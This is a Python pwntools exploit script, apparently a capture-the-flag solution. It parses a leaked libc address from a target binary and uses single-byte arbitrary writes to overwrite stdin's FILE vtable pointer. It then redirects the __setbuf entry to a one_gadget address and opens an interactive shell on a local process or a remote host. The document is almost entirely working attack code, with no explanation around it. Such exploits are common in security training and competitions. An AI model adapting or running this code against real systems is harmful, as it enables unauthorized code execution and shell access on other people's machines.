# -*- coding: utf-8 -*-
from pwn import *

g_fname = args.FNAME 
g_elf = ELF(g_fname)
context.binary = g_elf
g_libcname = args.LIB if (args.LIB) else "/lib/x86_64-linux-gnu/libc.so.6"

if (args.LOCAL):
	g_io = process(g_fname)
else:
    rhost, rport = args.REMOTE.split(":")
    g_io = remote(rhost, int(rport))

g_libc = ELF(g_libcname)

def getpid():
	if (args.LOCAL):
		log.info("PID: %d", g_io.proc.pid)
		pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def pwn():
    ru("here is a gift ")
    addr_sleep = int(ru(',', drop=True), 16)
    libc_base = addr_sleep - g_libc.symbols["sleep"]
    one_gadget = libc_base + 0xf02a4
    log.debug("addr_sleep=%#x\n\tlibc@%#x\n\tone_gadget@%#x"
        , addr_sleep
        , libc_base
        , one_gadget
    )

    g_libc.address = libc_base
    addr_stdin = g_libc.symbols["_IO_2_1_stdin_"]
    addr_fake_vtb = addr_stdin + 9*8
    for i in range(2):
        s(p64(addr_stdin + 0xd8 + i))
        s(p64(addr_fake_vtb)[i:i+1])

    getpid()
    # target is __setbuf
    addr_target = addr_fake_vtb + 11*8
    for i in range(3):
        s(p64(addr_target + i))
        s(p64(one_gadget)[i:i+1])

if ("__main__" == __name__):
	if (args.DEBUG):
		context.log_level = "debug"
	pwn()
	g_io.interactive()

